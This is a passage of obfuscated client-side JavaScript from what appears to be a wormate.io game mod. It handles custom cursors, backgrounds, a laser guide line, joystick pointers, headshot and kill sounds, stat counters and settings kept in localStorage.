            if (_0x2fd285.charAt(0) === "t" && _0x2a84c4.call(this, _0x2fd285) && !isNaN(+_0x2fd285.slice(1))) {
              this[_0x2fd285] = _0x553584;
            }
          }
        }
      },
      stop: function _0x22d7fd() {
        this.done = true;
        var _0x2b8422 = this.tryEntries[0].completion;
        if (_0x2b8422.type === "throw") {
          throw _0x2b8422.arg;
        }
        return this.rval;
      },
      dispatchException: function _0x36cd73(_0x4634f7) {
        if (this.done) {
          throw _0x4634f7;
        }
        var _0x24870a = this;
        function _0x33f5c3(_0x4069ca, _0xf3ab93) {
          _0x1896eb.type = "throw";
          _0x1896eb.arg = _0x4634f7;
          _0x24870a.next = _0x4069ca;
          if (_0xf3ab93) {
            _0x24870a.method = "next";
            _0x24870a.arg = _0x553584;
          }
          return !!_0xf3ab93;
        }
        for (var _0x1bda35 = this.tryEntries.length - 1; _0x1bda35 >= 0; --_0x1bda35) {
          var _0xec8ab5 = this.tryEntries[_0x1bda35];
          var _0x1896eb = _0xec8ab5.completion;
          if (_0xec8ab5.tryLoc === "root") {
            return _0x33f5c3("end");
          }
          if (_0xec8ab5.tryLoc <= this.prev) {
            var _0x539119 = _0x2a84c4.call(_0xec8ab5, "catchLoc");
            var _0x5e2e0b = _0x2a84c4.call(_0xec8ab5, "finallyLoc");
            if (_0x539119 && _0x5e2e0b) {
              if (this.prev < _0xec8ab5.catchLoc) {
                return _0x33f5c3(_0xec8ab5.catchLoc, true);
              }
              if (this.prev < _0xec8ab5.finallyLoc) {
                return _0x33f5c3(_0xec8ab5.finallyLoc);
              }
            } else if (_0x539119) {
              if (this.prev < _0xec8ab5.catchLoc) {
                return _0x33f5c3(_0xec8ab5.catchLoc, true);
              }
            } else {
              if (!_0x5e2e0b) {
                throw Error("try statement without catch or finally");
              }
              if (this.prev < _0xec8ab5.finallyLoc) {
                return _0x33f5c3(_0xec8ab5.finallyLoc);
              }
            }
          }
        }
      },
      abrupt: function _0x4d5fd5(_0x480180, _0x4b1d36) {
        for (var _0x3c91e6 = this.tryEntries.length - 1; _0x3c91e6 >= 0; --_0x3c91e6) {
          var _0x2a7669 = this.tryEntries[_0x3c91e6];
          if (_0x2a7669.tryLoc <= this.prev && _0x2a84c4.call(_0x2a7669, "finallyLoc") && this.prev < _0x2a7669.finallyLoc) {
            var _0x40a943 = _0x2a7669;
            break;
          }
        }
        if (_0x40a943 && (_0x480180 === "break" || _0x480180 === "continue") && _0x40a943.tryLoc <= _0x4b1d36 && _0x4b1d36 <= _0x40a943.finallyLoc) {
          _0x40a943 = null;
        }
        var _0x54a9ad = _0x40a943 ? _0x40a943.completion : {};
        _0x54a9ad.type = _0x480180;
        _0x54a9ad.arg = _0x4b1d36;
        if (_0x40a943) {
          this.method = "next";
          this.next = _0x40a943.finallyLoc;
          return _0x35c8a2;
        } else {
          return this.complete(_0x54a9ad);
        }
      },
      complete: function _0x12a851(_0x2a4951, _0x416fb5) {
        if (_0x2a4951.type === "throw") {
          throw _0x2a4951.arg;
        }
        if (_0x2a4951.type === "break" || _0x2a4951.type === "continue") {
          this.next = _0x2a4951.arg;
        } else if (_0x2a4951.type === "return") {
          this.rval = this.arg = _0x2a4951.arg;
          this.method = "return";
          this.next = "end";
        } else if (_0x2a4951.type === "normal" && _0x416fb5) {
          this.next = _0x416fb5;
        }
        return _0x35c8a2;
      },
      finish: function _0x257afd(_0x289215) {
        for (var _0xcf9551 = this.tryEntries.length - 1; _0xcf9551 >= 0; --_0xcf9551) {
          var _0x1501f2 = this.tryEntries[_0xcf9551];
          if (_0x1501f2.finallyLoc === _0x289215) {
            this.complete(_0x1501f2.completion, _0x1501f2.afterLoc);
            _0x5ecadd(_0x1501f2);
            return _0x35c8a2;
          }
        }
      },
      catch: function _0x17a717(_0x5023ae) {
        for (var _0x401cec = this.tryEntries.length - 1; _0x401cec >= 0; --_0x401cec) {
          var _0x38ff2b = this.tryEntries[_0x401cec];
          if (_0x38ff2b.tryLoc === _0x5023ae) {
            var _0xcfe4e7 = _0x38ff2b.completion;
            if (_0xcfe4e7.type === "throw") {
              var _0x15f6b2 = _0xcfe4e7.arg;
              _0x5ecadd(_0x38ff2b);
            }
            return _0x15f6b2;
          }
        }
        throw Error("illegal catch attempt");
      },
      delegateYield: function _0x43b4bf(_0x24a9ef, _0x5cbe2a, _0x55c631) {
        this.delegate = {
          iterator: _0x352433(_0x24a9ef),
          resultName: _0x5cbe2a,
          nextLoc: _0x55c631
        };
        if (this.method === "next") {
          this.arg = _0x553584;
        }
        return _0x35c8a2;
      }
    };
    return _0x4c1a43;
  }
  function _0x5a700a(_0x5eb32b, _0x1456f5, _0x593bbc, _0x4a16f3, _0x56ca27, _0x45a778, _0xf99958) {
    try {
      var _0x42e52d = _0x5eb32b[_0x45a778](_0xf99958);
      var _0x6f549e = _0x42e52d.value;
    } catch (_0x480e67) {
      _0x593bbc(_0x480e67);
      return;
    }
    if (_0x42e52d.done) {
      _0x1456f5(_0x6f549e);
    } else {
      Promise.resolve(_0x6f549e).then(_0x4a16f3, _0x56ca27);
    }
  }
  function _0x8f1d97(_0x51872e) {
    return function () {
      var _0x21ad89 = this;
      var _0xafbc6d = arguments;
      return new Promise(function (_0x1b2314, _0x237022) {
        var _0x58f29a = _0x51872e.apply(_0x21ad89, _0xafbc6d);
        function _0x3d4108(_0x49503d) {
          _0x5a700a(_0x58f29a, _0x1b2314, _0x237022, _0x3d4108, _0x24af37, "next", _0x49503d);
        }
        function _0x24af37(_0x3caa7e) {
          _0x5a700a(_0x58f29a, _0x1b2314, _0x237022, _0x3d4108, _0x24af37, "throw", _0x3caa7e);
        }
        _0x3d4108(undefined);
      });
    };
  }
  function _0x185438(_0x3bbc1a) {
    '@babel/helpers - typeof';

    _0x185438 = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function (_0x4b64b5) {
      return typeof _0x4b64b5;
    } : function (_0x8741b8) {
      if (_0x8741b8 && typeof Symbol == "function" && _0x8741b8.constructor === Symbol && _0x8741b8 !== Symbol.prototype) {
        return "symbol";
      } else {
        return typeof _0x8741b8;
      }
    };
    return _0x185438(_0x3bbc1a);
  }
  var _0x82ea18 = 0;
  var _0x38f67d = false;
  var _0x178144 = 25;
  window.backgroundArena = [{
    nome: "Default",
    uri: atob(savedImages[24])
  }, {
    nome: "sky",
    uri: atob(savedImages[28])
  }, {
    nome: "Green",
    uri: atob(savedImages[29])
  }, {
    nome: "Blue",
    uri: atob(savedImages[37])
  }, {
    nome: "Blue Black",
    uri: atob(savedImages[32])
  }, {
    nome: "Blue Light",
    uri: atob(savedImages[31])
  }, {
    nome: "Desert",
    uri: atob(savedImages[26])
  }, {
    nome: "Textil",
    uri: atob(savedImages[25])
  }, {
    nome: "Sky Blue",
    uri: atob(savedImages[30])
  }, {
    nome: "Sky Purp",
    uri: atob(savedImages[27])
  }, {
    nome: "Sky Violet",
    uri: atob(savedImages[38])
  }, {
    nome: "Sky Orange",
    uri: atob(savedImages[39])
  }];
  window.CursorSystem = {
    cursors: [{
      name: "Turquoise Mouse Pointer",
      url: atob(savedImages[40])
    }, {
      name: "White Mouse Pointer",
      url: atob(savedImages[41])
    }, {
      name: "Pink Octopus Cursor",
      url: atob(savedImages[42])
    }, {
      name: "Beetle Cursor",
      url: atob(savedImages[43])
    }, {
      name: "TikTok Cursor",
      url: atob(savedImages[44])
    }, {
      name: "Watermelon Cursor",
      url: atob(savedImages[45])
    }, {
      name: "Red Lipstick Cursor",
      url: atob(savedImages[46])
    }, {
      name: "Flame Cursor",
      url: atob(savedImages[47])
    }, {
      name: "Cherries Cursor",
      url: atob(savedImages[48])
    }, {
      name: "Pink Hearts Cursor",
      url: atob(savedImages[49])
    }, {
      name: "Spray Can Cursor",
      url: atob(savedImages[50])
    }, {
      name: "Beach Umbrella Cursor",
      url: atob(savedImages[51])
    }, {
      name: "Three-colored Glove Cursor",
      url: atob(savedImages[52])
    }, {
      name: "Pink Dolphin Cursor",
      url: atob(savedImages[53])
    }, {
      name: "Mushroom Cursor",
      url: atob(savedImages[54])
    }, {
      name: "Octopus Glove Cursor",
      url: atob(savedImages[55])
    }, {
      name: "Yellow Cheese Cursor",
      url: atob(savedImages[56])
    }, {
      name: "Roasting Marshmallow Cursor",
      url: atob(savedImages[57])
    }, {
      name: "White Glove Cursor",
      url: atob(savedImages[58])
    }, {
      name: "Red Pepper Cursor",
      url: atob(savedImages[59])
    }, {
      name: "Magic Wand with Golden Star Cursor",
      url: atob(savedImages[60])
    }, {
      name: "Strawberry and Chocolate Ice Cream Cursor",
      url: atob(savedImages[61])
    }, {
      name: "Dagger Cursor",
      url: atob(savedImages[62])
    }, {
      name: "Pizza Slice Cursor",
      url: atob(savedImages[63])
    }, {
      name: "Strawberry Candy Cursor",
      url: atob(savedImages[64])
    }, {
      name: "Rose Branch Cursor",
      url: atob(savedImages[65])
    }, {
      name: "Electrical Plug Cursor",
      url: atob(savedImages[66])
    }, {
      name: "Heart on Stick Cursor",
      url: atob(savedImages[67])
    }],
    apply: function (_0x305051) {
      try {
        document.body.style.cursor = "url(" + _0x305051 + "), auto";
        const _0x1b3a20 = document.querySelectorAll("#game-cont, #game-canvas, canvas, .game-area");
        _0x1b3a20.forEach(_0x35c946 => {
          _0x35c946.style.cursor = "url(" + _0x305051 + "), auto";
        });
        vps.selectedCursor = _0x305051;
        localStorage.setItem("SaveGamewup", JSON.stringify(vps));
        localStorage.setItem("selectedCursor", _0x305051);
        return true;
      } catch (_0x58352c) {
        console.error("❌ Failed to apply cursor:", _0x58352c);
        return false;
      }
    },
    reset: function () {
      try {
        document.body.style.cursor = "default";
        const _0x31c142 = document.querySelectorAll("#game-cont, #game-canvas, canvas, .game-area");
        _0x31c142.forEach(_0x127512 => {
          _0x127512.style.cursor = "default";
        });
        vps.selectedCursor = null;
        localStorage.setItem("SaveGamewup", JSON.stringify(vps));
        localStorage.removeItem("selectedCursor");
        return true;
      } catch (_0x50b83b) {
        console.error("❌ Failed to reset cursor:", _0x50b83b);
        return false;
      }
    },
    getSaved: function () {
      return localStorage.getItem("selectedCursor") || vps.selectedCursor || null;
    },
    loadSaved: function () {
      const _0x26ac5c = this.getSaved();
      if (_0x26ac5c) {
        this.apply(_0x26ac5c);
        return _0x26ac5c;
      }
      return null;
    }
  };
  document.addEventListener("DOMContentLoaded", function () {
    setTimeout(() => {
      if (window.CursorSystem) {
        window.CursorSystem.loadSaved();
      }
    }, 1000);
  });
  var _0x11c869 = null;
  var _0x19c3f8 = true;
  var _0x378a4e = 2;
  var _0x4c5834 = null;
  var _0x15b497 = 1;
  var _0x5f32d0 = null;
  var _0x44895b = {};
  window.createLine = function (_0x5f2bcd, _0x4a3494) {
    var _0x352eec = new PIXI.Graphics();
    var _0x2349e6 = 16766720;
    if (vps.laserColor && typeof vps.laserColor === "string") {
      _0x2349e6 = parseInt(vps.laserColor.replace("#", ""), 16);
    }
    _0x352eec.lineStyle(0.1, _0x2349e6, 1);
    _0x352eec.moveTo(0, 0);
    _0x352eec.lineTo(0, 0);
    _0x352eec.zIndex = 20;
    _0x352eec.name = "lineHS";
    _0x352eec.alpha = 0;
    _0x5f2bcd.addChild(_0x352eec);
  };
  window.movimentaLinha = function () {
    try {
      if (!_wup._anApp.dh.ch.Nm) {
        return;
      }
      var _0x2504b1 = _wup._anApp.og.af.ng.mf.getChildByName("lineHS");
      var _0x2dcd3c = _wup._anApp.dh.ch.Nm.oc;
      var _0x46505c = _0x2dcd3c.position.x;
      var _0xb9dda8 = _0x2dcd3c.position.y;
      var _0x2c509f = 16766720;
      if (vps.laserColor && typeof vps.laserColor === "string") {
        _0x2c509f = parseInt(vps.laserColor.replace("#", ""), 16);
      }
      _0x2504b1.clear();
      _0x2504b1.lineStyle(0.1, _0x2c509f, 1);
      _0x2504b1.moveTo(0, 0);
      _0x2504b1.lineTo(_0x46505c, _0xb9dda8);
      if (vps.laserActive) {
        _0x2504b1.alpha = vps.laserOpacity || 0.3;
      } else {
        _0x2504b1.alpha = 0;
      }
    } catch (_0x36a767) {
      console.error(_0x36a767);
    }
  };
  window.updateGamePointers = function (_0x54aede, _0x1faea8) {
    if (!_wup._anApp.dh.ch.Nm || !_wup._anApp.og.af.ng.Tg) {
      return;
    }
    if (vps.joystickType === 6) {
      return;
    }
    let _0x1eaae = null;
    if (vps.joystickType === 1) {
      _0x1eaae = "img_p_1";
    } else if (vps.joystickType === 2) {
      _0x1eaae = "img_p_2";
    } else if (vps.joystickType === 3) {
      _0x1eaae = "img_p_3";
    } else if (vps.joystickType === 4) {
      _0x1eaae = "img_p_4";
    } else if (vps.joystickType === 5) {
      _0x1eaae = "img_p_5";
    }
    const _0x78e0e6 = document.getElementById(_0x1eaae);
    if (_0x78e0e6) {
      if (_0x54aede && _0x1faea8 && (Math.abs(_0x1faea8.x) > 0.05 || Math.abs(_0x1faea8.y) > 0.05)) {
        const _0x525ea6 = window.innerWidth / 2;
        const _0x4afd42 = window.innerHeight / 2;
        _0x78e0e6.style.left = _0x525ea6 + _0x1faea8.x * 60 - 8 + "px";
        _0x78e0e6.style.top = _0x4afd42 + _0x1faea8.y * 60 - 8 + "px";
        _0x78e0e6.style.opacity = "1";
      } else if (!_0x54aede) {
        if (vps.joystickType === 2 || vps.joystickType === 3) {
          if (vps.joystick && vps.joystick.mode === "dynamic") {
            _0x78e0e6.style.opacity = "0";
          } else {
            _0x78e0e6.style.opacity = "0.25";
          }
        } else {
          _0x78e0e6.style.opacity = "0.25";
        }
      }
    }
  };
  window.updateJoystickPointers = function (_0x58d89d, _0x59a52e) {
    if (!window.joystickPointers || !_wup._anApp.dh.ch.Nm) {
      return;
    }
    let _0x4f3d32 = "mp_1";
    if (vps.joystickType === 2 || vps.joystickType === 4 || vps.joystickType === 5) {
      _0x4f3d32 = "mp_2";
    } else if (vps.joystickType === 3) {
      _0x4f3d32 = "mp_3";
    }
    Object.keys(window.joystickPointers).forEach(function (_0x19ac6c) {
      window.joystickPointers[_0x19ac6c].visible = false;
    });
    const _0x24c31b = window.joystickPointers[_0x4f3d32];
    if (_0x24c31b && _wup._anApp.dh.ch.Nm.oc) {
      _0x24c31b.visible = true;
      _0x24c31b.alpha = _0x58d89d ? 1 : 0.25;
      const _0x29c836 = _wup._anApp.dh.ch.Nm.oc.position;
      const _0x490d86 = 60;
      _0x24c31b.x = _0x29c836.x + Math.cos(_0x59a52e) * _0x490d86;
      _0x24c31b.y = _0x29c836.y + Math.sin(_0x59a52e) * _0x490d86;
    }
  };
  var _0x560f4a = {
    ref: [],
    hs: {},
    library: {
      headshot: [atob(savedImages[34]), atob(savedImages[99]), atob(savedImages[90]), atob(savedImages[100]), atob(savedImages[101]), atob(savedImages[102]), atob(savedImages[103]), atob(savedImages[91]), atob(savedImages[92]), atob(savedImages[93]), atob(savedImages[94]), atob(savedImages[95]), atob(savedImages[96]), atob(savedImages[97])],
      monsterKill: [atob(savedImages[98]), atob(savedImages[104]), atob(savedImages[105])]
    },
    fxdo: function (_0x240fee) {
      if (window.vps.soundEnabled && _0x560f4a[_0x240fee] && typeof _0x560f4a[_0x240fee].play === "function") {
        _0x560f4a[_0x240fee].play();
      }
    }
  };
  _0x560f4a.headshot = {
    playing: function () {
      return false;
    },
    play: function () {
      if (!window.vps.soundEnabled) {
        return;
      }
      try {
        const _0x25a87d = window.vps.soundSettings.headshotSound;
        const _0x40862b = _0x560f4a.library.headshot[_0x25a87d];
        const _0xc85e3b = new Audio(_0x40862b);
        _0xc85e3b.volume = window.vps.soundSettings.volume / 100;
        _0xc85e3b.play();
      } catch (_0x10df3d) {}
    }
  };
  _0x560f4a.monsterKillSound = {
    playing: function () {
      return false;
    },
    play: function () {
      if (!window.vps.soundEnabled) {
        return;
      }
      try {
        const _0x39d4ba = window.vps.soundSettings.monsterKillSound;
        const _0x47f1d6 = _0x560f4a.library.monsterKill[_0x39d4ba];
        const _0xb561e2 = new Audio(_0x47f1d6);
        _0xb561e2.volume = window.vps.soundSettings.volume / 100;
        _0xb561e2.play();
      } catch (_0x5b9339) {}
    }
  };
  window._wup = {
    memory: {},
    mySkin: null,
    customPaths: {
      map: {},
      texture: "default.png",
      addMapping: function (_0x11c6d2, _0x2835a1, _0xc2cb13) {
        if (!this.map) {
          this.map = {};
        }
        this.map[_0x11c6d2] = {
          x: _0x2835a1 || 0,
          y: _0xc2cb13 || 0
        };
      }
    },
    _ass_type: [],
    deathMarker: {
      lastDeathPos: null,
      deathMark: null,
      blinkTimer: null,
      removeTimer: null,
      saveDeath: function () {
        if (window.playerCoords) {
          this.lastDeathPos = {
            x: window.playerCoords.x,
            y: window.playerCoords.y
          };
        }
      },
      showDeath: function () {
        if (!this.lastDeathPos) {
          return;
        }
        this.removeDeath();
        if (this.deathMark) {
          try {
            this.deathMark.destroy({
              children: true,
              texture: false,
              baseTexture: false
            });
          } catch (_0xbfde75) {}
        }
        this.deathMark = new PIXI.Text("X", {
          fontFamily: "PTSans",
          fontSize: "12px",
          fill: "red",
          align: "center",
          fontWeight: "bold",
          stroke: "white",
          strokeThickness: 1
        });
        this.deathMark.anchor.set(0.5);
        this.deathMark.position.x = this.lastDeathPos.x;
        this.deathMark.position.y = this.lastDeathPos.y;
        this.deathMark.zIndex = 1000;
        if (window._wupin && _wupin.myLocation && _wupin.myLocation.parent) {
          _wupin.myLocation.parent.addChild(this.deathMark);
        }
        let _0x472810 = true;
        this.blinkTimer = setInterval(() => {
          if (this.deathMark) {
            _0x472810 = !_0x472810;
            this.deathMark.visible = _0x472810;
          }
        }, 500);
        this.removeTimer = setTimeout(() => {
          this.removeDeath();
        }, 25000);
      },
      removeDeath: function () {
        if (this.blinkTimer) {
          clearInterval(this.blinkTimer);
          this.blinkTimer = null;
        }
        if (this.removeTimer) {
          clearTimeout(this.removeTimer);
          this.removeTimer = null;
        }
        if (this.deathMark) {
          if (this.deathMark.parent) {
            this.deathMark.parent.removeChild(this.deathMark);
          }
          try {
            this.deathMark.destroy();
          } catch (_0x964bcb) {}
          this.deathMark = null;
        }
      }
    },
    testSkinMod: function _0x279890(_0x4dd033) {
      var _0x10c9b0 = typeof _0x4dd033 === "string";
      _0x4dd033 = parseInt(_0x4dd033);
      if (_0x10c9b0 && isNaN(_0x4dd033)) {
        return false;
      } else {
        return parseInt(_0x4dd033) >= 399 && parseInt(_0x4dd033) < 8999;
      }
    },
    testWear: function _0x428748(_0xd5597c) {
      var _0x4ef403 = typeof _0xd5597c === "string";
      _0xd5597c = parseInt(_0xd5597c);
      if (_0x4ef403 && isNaN(_0xd5597c)) {
        return false;
      } else {
        return parseInt(_0xd5597c) >= 399 && parseInt(_0xd5597c) < 8999;
      }
    },
    isNumberValid: function _0x5008bb(_0x31be79) {
      return _0x31be79 !== "" && _0x31be79 !== null && _0x31be79 !== undefined && !isNaN(_0x31be79);
    },
    validInputWear: function _0x358ddd(_0xb59ea2) {
      var _0x4a48b2 = _wup.testWear(_0xb59ea2);
      var _0x2c5f52 = typeof skinId === "string";
      if (!_0x4a48b2 && !_0x2c5f52) {
        return _0xb59ea2;
      }
      return 0;
    },
    validInput: function _0x2838a5(_0x2bf77) {
      var _0x1bbd4e = _wup.testSkinMod(_0x2bf77);
      var _0x52e8fe = typeof _0x2bf77 === "string";
      if (!_0x1bbd4e && !_0x52e8fe) {
        return _0x2bf77;
      }
      try {
        return encodeURI(35);
      } catch (_0x41e0bc) {
        return encodeURI(35);
      }
    },
    fullscreen: null,
    joystick: function _0x50e3fa(_0x2df825) {
      var _0x5bc92e = {
        checked: true,
        color: "red",
        mode: "dynamic",
        positionMode: "L",
        size: 100,
        pxy: 100
      };
      return _0x5bc92e;
    },
    load_con: function _0x3388b0() {
      $(".selecionar-sala-v2").click(function (_0x587970) {
        _0x587970.preventDefault();
        var _0x53f7ee = $(this).attr("data-con") || vps.con;
        var _0x3b7bea = $(this).attr("data-type");
        ctxx.addRoom($(this).attr("data-room"));
        _0x3b6ea9.dh.Zp = function (_0x57ebc9, _0x491711, _0x2ccd3c) {
          vps.con = _0x2ccd3c ? _0x57ebc9 : _0x53f7ee || _0x57ebc9;
          _wup.Zp(vps.con, _0x491711);
        };
        _0x3b6ea9.Pn();
      });
    },
    fnSaveGame: function _0x5b3675() {
      var _0x11943f = $("#saveGame");
      _0x11943f.prop("checked", vps.saveGame);
      _0x11943f.change(function () {
        if (!this.checked) {
          var _0x2fd96c = confirm("English:\nAttention: the records will be deleted; Confirm?\n\nArabic:\nتنبيه: سيتم حذف السجلات، هل تؤكد؟");
          $(this).prop("checked", !_0x2fd96c);
          if (!this.checked) {
            _wup.fnSetCounts("zerar");
          }
        }
        vps.saveGame = this.checked;
        ctxx.hsTotal.alpha = this.checked ? 1 : 0;
        ctxx.killTotal.alpha = this.checked ? 1 : 0;
        localStorage.setItem("SaveGamewup", this.checked ? JSON.stringify(vps) : null);
      });
    },
    fnSetCounts: function _0x5b8a7f(_0x2e28bf, _0x5aa5e6) {
      var _0x230a66 = function _0x478dde(_0x9df029, _0x5b19ac, _0x32e0eb, _0x502251) {
        _wup.setCountGame(_0x9df029, _0x5b19ac, _0x32e0eb, _0x502251);
      };
      if (_0x2e28bf === "count") {
        vps.kill = (vps.kill || 0) + (_0x5aa5e6 ? 0 : 1);
        vps.headshot = (vps.headshot || 0) + (_0x5aa5e6 ? 1 : 0);
        vps.HOL = vps.headshot > vps.HOL ? vps.headshot : vps.HOL;
        vps.tkill = vps.tkill + (_0x5aa5e6 ? 0 : 1);
        vps.theadshot = vps.theadshot + (_0x5aa5e6 ? 1 : 0);
      }
      if (_0x2e28bf === "open") {
        vps.kill = 0;
        vps.headshot = 0;
        if (vps.saveGame) {}
      }
      if (_0x2e28bf === "close") {
        if (vps.saveGame) {
          vps.died = (vps.died || 0) + 1;
        } else {
          _wup.fnSetCounts("zerar");
        }
      }
      if (_0x2e28bf === "zerar") {
        vps.kill = 0;
        vps.tkill = 0;
        vps.headshot = 0;
        vps.theadshot = 0;
        vps.died = 0;
      }
      _0x230a66(vps.kill, vps.headshot, vps.tkill, vps.theadshot);
      localStorage.setItem("SaveGamewup", JSON.stringify(vps));
    },
    setCountGame: function _0x38d5f1(_0xca7b22, _0x1e75a0, _0x17b840, _0x27fd5b) {
      if (!vps.saveGame) {
        ctxx.hsTotal.alpha = 0;
        ctxx.killTotal.alpha = 0;
      }
      ctxx.hs.text = _0x1e75a0;
      ctxx.hsTotal.text = _0x27fd5b;
      ctxx.kill.text = _0xca7b22;
      ctxx.killTotal.text = _0x17b840;
    },
    startGame: function () {
      this.deathMarker.showDeath();
    },
    stopGame: function () {
      this.deathMarker.saveDeath();
    },
    ismobile: _0x15fad3(),
    Zp: undefined
  };
  window.vps = {
    favoriteSkins: [],
    skinr: {},
    sg: [],
    s_l: "https://wormup.in",
    pm: {},
    j: null,
    pk: 0,
    pk0: "",
    pk1: "",
    pk2: "",
    pk3: "",
    pk4: "",
    pk5: "",
    pk6: "",
    z: 1,
    c_v: 222,
    c_1: "UP",
    c_2: "TeamUP",
    c_3: "wormup",
    c_4: "wormate.io",
    c_5: "please don't copy my code",
    d_1: "VlZBPQ==",
    d_2: "VkdWaGJWVlE=",
    d_3: "ZDI5eWJYVnc=",
    d_4: "VjI5eWJXRjBaUzVwYnc9PQ==",
    d_5: "VUd4bFlYTmxJR1J2YmlkMElHTnZjSGtnYlhrZ1kyOWtaUT09",
    a: 0,
    b: 0,
    c: 0,
    d: 0,
    e: 0,
    f: "",
    g: 36,
    smoothCamera: 0.5,
    eat_animation: 0.0025,
    PortionSize: localStorage.PotenciadorSize || 1,
    PortionAura: localStorage.PotenciadorAura || 1,
    PortionTransparent: 0.8,
    FoodTransparent: 0.3,
    FoodShadow: localStorage.ComidaShadow || 1,
    FoodSize: localStorage.ComidaSize || 1,
    version: 0,
    headshot: 0,
    kill: 0,
    hudSettings: {
      mode: 0,
      wi: 0.5
    },
    bannedWordsEnabled: false,
    bannedWords: [],
    theadshot: 0,
    tkill: 0,
    died: 0,
    start: 0,
    HOL: 0,
    flx: 0,
    vp: false,
    tk: null,
    country: null,
    finish: 0,
    saveGame: false,
    mobile: false,
    joystick: null,
    configJoystick: {
      buttons: {
        respawn: {
          label: "RESPAWN",
          labelAbbreviation: "RP",
          active: false,
          action: "gtr.gtrass6()"
        },
        lobby: {
          label: "HOME",
          labelAbbreviation: "H",
          active: true,
          action: "gtr.gtrass5()"
        },
        rotate: {
          label: "ROTATE",
          labelAbbreviation: "A",
          active: true,
          action: "gtr.gtrass4()"
        },
        snail: {
          label: "SNAIL",
          labelAbbreviation: "B",
          active: true,
          action: "gtr.gtrass3()"
        },
        swap: {
          label: "SWAP",
          labelAbbreviation: "SW",
          active: false,
          action: "gtr.gtr_skinr()"
        },
        zoomplus: {
          label: "Z+",
          labelAbbreviation: "+",
          active: true,
          action: "gtr.gtrass1()"
        },
        zoomminus: {
          label: "Z-",
          labelAbbreviation: "-",
          active: true,
          action: "gtr.gtrass2()"
        },
        zoom: {
          label: "x1",
          labelAbbreviation: "x1",
          active: true,
          action: "gtr.gtrass7()"
        },
        laser: {
          label: "LASER",
          labelAbbreviation: "L",
          active: true,
          action: "gtr.gtrass12()"
        }
      },
      typeZoom: ["btn", "range"],
      typeCurrent: "btn",
      typeName: ["abb"],
      typeCurrentName: "abb"
    },
    joystickType: 1,
    display: {
      customClock: null,
      clock: {
        x: 60,
        y: 60
      },
      top: {
        x: 225,
        y: 1
      },
      default: false,
      custom: false,
      m: {
        x: 60,
        y: 60
      },
      r: {
        x: 225,
        y: 1
      },
      ms: false
    },
    PropertyManager: {},
    acs: true,
    lr: 10,
    con: null,
    params: "",
    arrow: true,
    activeBadLang: false,
    soundEnabled: true,
    soundSettings: {
      headshotSound: 0,
      monsterKillSound: 0,
      volume: 50
    },
    messageSettings: {
      defaultMessages: false,
      killMsg: "Well Done!",
      headshotMsg: "HEADSHOT",
      showKillName: true,
      showHeadshotName: true,
      killNamePos: "after",
      headshotNamePos: "after",
      killMsgType: "preset",
      headshotMsgType: "preset",
      killCustomText: "",
      headshotCustomText: ""
    },
    activeZoom: true,
    activeZoomMobile: true,
    top10Show: [],
    background: null,
    backgroundMap: false,
    nickname: null,
    code: null,
    configZoom: {
      limitDown: 0.5,
      step: 0.25,
      closeUp: 0.5,
      closeDown: 1
    },
    laserActive: false,
    laserColor: "#FFD700",
    laserOpacity: 0.3,
    enemyNameColor: null,
    enemyNameFontSize: null,
    novidadewormup: 0
  };
  function _0x39b831() {
    const _0x5af0df = window._wup._anApp;
    if (_0x5af0df && _0x5af0df.dh && _0x5af0df.dh.Fh) {
      for (let _0x50bda6 in _0x5af0df.dh.Fh) {
        let _0x1b4ef8 = _0x5af0df.dh.Fh[_0x50bda6];
        if (_0x1b4ef8 && _0x1b4ef8.Om && _0x1b4ef8.Eh && _0x1b4ef8.Eh.ma) {
          var _0x34294a = _0x1b4ef8.Eh.ma;
          if (window.vps.bannedWordsEnabled) {
            _0x34294a = _0x553ea5(_0x1b4ef8.Eh.ma, false);
          }
          _0x1b4ef8.Om.text = _0x19c3f8 ? _0x34294a : "-----";
        }
      }
    }
  }
  var _0x18eb70 = localStorage.getItem("wup_version");
  var _0x33c950 = localStorage.getItem("SaveGamewup");
  var _0x1972ff = localStorage.getItem("wup_config");
  _0x33c950 &&= JSON.parse(_0x33c950);
  try {
    var _0x436f67 = localStorage.getItem("SaveGamewup");
    if (_0x436f67) {
      var _0x2d01a7 = JSON.parse(_0x436f67);
      if (_0x2d01a7.skinr) {
        vps.skinr = _0x2d01a7.skinr;
      }
    }
    var _0x29ea4d = localStorage.getItem("SaveGameup");
    if (_0x29ea4d) {
      var _0x20ed97 = JSON.parse(_0x29ea4d);
      if (_0x20ed97.favoriteSkins) {
        vps.favoriteSkins = _0x20ed97.favoriteSkins;
      }
    }
  } catch (_0xb07013) {
    console.warn("Could not load saved settings:", _0xb07013);
  }
  if (_0x33c950) {
    if (_0x33c950.laser && !_0x33c950.laserOpacity) {
      var _0xcd6b3c = parseFloat(_0x33c950.laser);
      _0x33c950.laserOpacity = Math.max(0.1, Math.min(1, _0xcd6b3c));
      delete _0x33c950.laser;
    }
  }
  if (!vps.laserOpacity) {
    vps.laserOpacity = 0.3;
  }
  for (var _0x599861 in _0x33c950) {
    switch (_0x599861) {
      case "configJoystick":
        if (!_0x33c950[_0x599861]) {
          break;
        }
        vps[_0x599861] = _0x33c950[_0x599861];
        for (var _0xf2e7cf in _0x33c950[_0x599861].buttons) {
          vps[_0x599861].buttons[_0xf2e7cf] = _0x33c950[_0x599861].buttons[_0xf2e7cf];
        }
        for (var _0xc4aa83 in _0x33c950[_0x599861]) {
          vps[_0x599861][_0xc4aa83] = _0x33c950[_0x599861][_0xc4aa83];
        }
        break;
      case "joystick":
        vps[_0x599861] = _wup.joystick();
        for (var _0x246482 in _0x33c950[_0x599861]) {
          vps[_0x599861][_0x246482] = _0x33c950[_0x599861][_0x246482];
        }
        break;
      case "display":
        for (var _0x11c2d2 in _0x33c950[_0x599861]) {
          vps[_0x599861][_0x11c2d2] = _0x33c950[_0x599861][_0x11c2d2];
        }
        break;
      default:
        vps[_0x599861] = _0x33c950[_0x599861];
        break;
    }
  }
  if (!vps.version || vps.version !== _0x378a4e) {
    vps.version = _0x378a4e;
    vps.joystick = _wup.joystick();
  }
  if (_0x33c950 && _0x33c950.joystickType) {
    vps.joystickType = _0x33c950.joystickType;
  } else if (!vps.joystickType) {
    vps.joystickType = 1;
  }
  const _0x290179 = [1, 2, 3, 4, 5, 6];
  if (!_0x290179.includes(vps.joystickType)) {
    vps.joystickType = 1;
  }
  setTimeout(() => {
    if (gtr.updateJoystickSwitchButton) {
      gtr.updateJoystickSwitchButton();
    }
  }, 1000);
  vps.loading = true;
